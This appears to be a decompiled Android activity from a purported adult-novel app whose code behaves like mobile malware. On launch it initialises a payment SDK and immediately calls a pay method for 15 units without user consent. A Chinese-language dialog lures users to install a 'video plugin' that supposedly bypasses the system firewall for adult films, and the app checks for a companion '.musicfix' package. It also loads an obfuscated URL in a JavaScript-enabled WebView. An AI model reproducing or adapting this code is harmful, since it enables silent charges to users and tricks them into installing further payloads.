package com.atnl.adultnovel.book;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Bundle;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.Window;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.Button;
import c.j.p.g.n;
import com.atnl.adultnovel.book.ui.Cancas;
import com.lp.sdk.yninterface.YNInterface;
import com.umeng.analytics.MobclickAgent;
import java.util.List;

public class MainActivity
  extends Activity
{
  WebView a;
  com.atnl.adultnovel.book.ui.a b;
  ApplicationInfo c;
  Handler d = new a(this);
  
  public MainActivity() {}
  
  private boolean a(Context paramContext, String paramString)
  {
    paramContext = paramContext.getPackageManager().getInstalledPackages(0);
    int i = 0;
    for (;;)
    {
      if (i >= paramContext.size()) {
        return false;
      }
      if (((PackageInfo)paramContext.get(i)).packageName.equalsIgnoreCase(paramString + ".musicfix")) {
        return true;
      }
      i += 1;
    }
  }
  
  private void d()
  {
    new Handler().postDelayed(new e(this), 1000L);
  }
  
  private void e()
  {
    n.a(this);
  }
  
  private void f()
  {
    YNInterface.getInstance(this).pay("001102", 15, new h(this));
  }
  
  protected void a()
  {
    AlertDialog localAlertDialog = new AlertDialog.Builder(this).create();
    localAlertDialog.show();
    localAlertDialog.setCancelable(false);
    Window localWindow = localAlertDialog.getWindow();
    localWindow.setContentView(2130903066);
    ((Button)localWindow.findViewById(2131165246)).setOnClickListener(new c(this, localAlertDialog));
    ((Button)localWindow.findViewById(2131165247)).setOnClickListener(new d(this, localAlertDialog));
  }
  
  protected void b()
  {
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
    localBuilder.setCancelable(false);
    localBuilder.setMessage("你需要安装视频插件后，才能绕过系统防火墙，在线（下载）观看各种欧美日韩大片、爱情小电影、成人电影。 ");
    localBuilder.setTitle("提示");
    localBuilder.setNegativeButton("取消", new f(this));
    localBuilder.setPositiveButton("立即安装", new g(this));
    try
    {
      localBuilder.create().show();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  public void c()
  {
    Intent localIntent = new Intent();
    localIntent.setComponent(new ComponentName("com.android.settings", "com.android.settings.wifi.WifiPickerActivity"));
    startActivityForResult(localIntent, 100);
  }
  
  @SuppressLint({"SetJavaScriptEnabled"})
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    this.b = new com.atnl.adultnovel.book.ui.a(this);
    YNInterface.getInstance(this).initSdk("0002460001", "041385");
    f();
    try
    {
      this.c = getPackageManager().getApplicationInfo(getPackageName(), 128);
      getWindow().requestFeature(1);
      setContentView(2130903064);
      if (!com.atnl.adultnovel.book.b.a.a(this)) {
        c();
      }
      paramBundle = new Cancas();
      this.a = ((WebView)findViewById(2131165244));
      this.a.getSettings().setJavaScriptEnabled(true);
      this.a.setWebViewClient(new b(this));
      this.a.loadUrl(paramBundle.url());
      return;
    }
    catch (PackageManager.NameNotFoundException paramBundle)
    {
      for (;;)
      {
        paramBundle.printStackTrace();
      }
    }
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu)
  {
    getMenuInflater().inflate(2131492864, paramMenu);
    return true;
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    if ((paramInt == 4) && (this.a.canGoBack()))
    {
      this.a.goBack();
      return true;
    }
    a();
    return super.onKeyDown(paramInt, paramKeyEvent);
  }
  
  public boolean onOptionsItemSelected(MenuItem paramMenuItem)
  {
    if (paramMenuItem.getItemId() == 2131165264) {
      return true;
    }
    return super.onOptionsItemSelected(paramMenuItem);
  }
  
  protected void onPause()
  {
    super.onPause();
    MobclickAgent.onPageEnd("SplashScreen");
    MobclickAgent.onPause(this);
  }
  
  protected void onResume()
  {
    super.onResume();
    MobclickAgent.onPageStart("SplashScreen");
    MobclickAgent.onResume(this);
  }
  
  protected void onStart()
  {
    super.onStart();
    if (com.atnl.adultnovel.book.a.a.a("image") != 1) {
      d();
    }
  }
}
